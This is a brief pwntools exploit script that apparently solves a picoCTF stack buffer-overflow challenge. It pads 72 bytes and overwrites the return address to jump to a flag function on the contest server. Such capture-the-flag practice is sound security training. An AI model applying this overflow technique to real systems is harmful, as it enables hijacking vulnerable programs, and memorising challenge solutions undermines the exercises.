from pwn import *
import os

os.system('clear')

addrFlag = 0x000000000040123b

sh = remote('saturn.picoctf.net', 56872)

p = b'A' * 72 # pattern offset of $rsp
p += p64(4198971) # flag address to decimal value

sh.recvuntil('\n')
sh.sendline(p)

sh.interactive()
